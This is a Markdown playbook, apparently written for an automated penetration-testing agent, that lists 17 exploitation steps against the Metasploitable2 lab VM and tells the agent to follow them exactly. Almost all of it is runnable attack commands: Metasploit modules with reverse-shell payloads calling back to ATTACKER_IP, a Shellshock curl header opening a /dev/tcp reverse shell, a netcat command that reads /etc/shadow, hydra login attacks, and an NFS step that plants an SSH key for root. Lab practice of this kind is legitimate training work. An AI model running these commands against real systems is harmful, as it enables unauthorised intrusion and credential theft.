---
name: metasploitable2-full-playbook
description: 'Complete Metasploitable2 exploitation playbook - ALL services, ALL exploits, in order'
domain: penetration-testing
subdomain: metasploitable2
tags: [metasploitable2, playbook, full-exploit, all-vulns, complete]
version: '2.0'
source: prebuilt
---

# Metasploitable2 COMPLETE Exploitation Playbook

## IMPORTANT: This is a TARGETED playbook. When you detect Metasploitable2, follow this EXACTLY.

## Phase 1: Quick Wins (DO THESE FIRST - direct root shells)

### 1. vsftpd 2.3.4 backdoor (port 21) → ROOT
```
tool: msfconsole
args: -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; exploit -z; exit"
```

### 2. Samba usermap (port 139/445) → ROOT  
```
tool: msfconsole
args: -x "use exploit/multi/samba/usermap_script; set RHOSTS TARGET; set PAYLOAD cmd/unix/reverse_netcat; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 3. UnrealIRCd backdoor (port 6667) → ROOT
```
tool: msfconsole
args: -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS TARGET; set PAYLOAD cmd/unix/reverse_netcat; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 4. Bindshell (port 1524) → ROOT
```
tool: shell
args: echo "id; whoami; cat /etc/shadow" | nc -w 5 TARGET 1524
```

## Phase 2: Default Credential Attacks

### 5. MySQL no-password (port 3306) → ROOT via UDF
```
tool: msfconsole
args: -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS TARGET; set USERNAME root; set PASSWORD ''; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 6. PostgreSQL default creds (port 5432) → postgres
```
tool: msfconsole
args: -x "use exploit/linux/postgres/postgres_payload; set RHOSTS TARGET; set USERNAME postgres; set PASSWORD postgres; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 7. Tomcat manager (port 8180) → tomcat
```
tool: msfconsole
args: -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 8. SSH brute force (port 22) → msfadmin
```
tool: hydra
args: -l msfadmin -p msfadmin -t 4 TARGET ssh
```

### 9. Telnet brute force (port 23) → msfadmin
```
tool: hydra
args: -l msfadmin -p msfadmin -t 4 TARGET telnet
```

### 10. VNC no-auth (port 5900) → root desktop
```
tool: msfconsole
args: -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS TARGET; set BLANK_PASSWORDS true; run; exit"
```

## Phase 3: Service-Specific Exploits

### 11. distcc (port 3632) → daemon
```
tool: msfconsole
args: -x "use exploit/unix/misc/distcc_exec; set RHOSTS TARGET; set PAYLOAD cmd/unix/reverse_netcat; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 12. Java RMI (port 1099) → daemon
```
tool: msfconsole
args: -x "use exploit/multi/misc/java_rmi_server; set RHOSTS TARGET; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 13. PHP-CGI (port 80) → www-data
```
tool: msfconsole
args: -x "use exploit/multi/http/php_cgi_arg_injection; set RHOSTS TARGET; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 14. dRuby (port 8787) → daemon
```
tool: msfconsole
args: -x "use exploit/linux/misc/drb_remote_codeexec; set RHOSTS TARGET; set PAYLOAD cmd/unix/reverse_netcat; set LHOST ATTACKER_IP; exploit -z; exit"
```

### 15. Shellshock CGI (port 80) → www-data
```
tool: shell
args: curl -A "() { :;}; echo; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" http://TARGET/cgi-bin/status
```

### 16. rlogin/rsh (port 512-514) → root
```
tool: shell
args: rlogin -l msfadmin TARGET
```

### 17. NFS privesc (port 2049) → root
```
tool: shell
args: showmount -e TARGET && mkdir -p /tmp/nfs && mount -t nfs TARGET:/ /tmp/nfs && cat ~/.ssh/id_rsa.pub >> /tmp/nfs/root/.ssh/authorized_keys && umount /tmp/nfs
```

## Summary
Total exploits: 17
Expected root shells: vsftpd, Samba, UnrealIRCd, Bindshell, MySQL UDF, NFS, rlogin
Expected user shells: PostgreSQL, Tomcat, SSH, Telnet, distcc, Java RMI, PHP-CGI, dRuby, Shellshock
